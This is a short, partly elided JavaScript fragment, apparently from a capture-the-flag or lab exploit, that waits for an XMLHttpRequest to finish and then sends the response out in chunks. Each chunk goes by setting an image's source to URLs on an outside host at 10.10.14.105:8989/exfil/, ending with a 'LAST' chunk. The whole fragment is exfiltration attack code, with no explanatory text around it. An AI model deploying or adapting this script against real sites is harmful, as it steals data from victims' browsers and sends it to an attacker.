	...
	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			...
			for (i = 0; i < numFullChunks; i++)
			{
				...
				downloadImage.src = "http://10.10.14.105:8989/exfil/" + i + "/" + exfilChunk + ".jpg";
			}
			...
			downloadImage.src = "http://10.10.14.105:8989/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
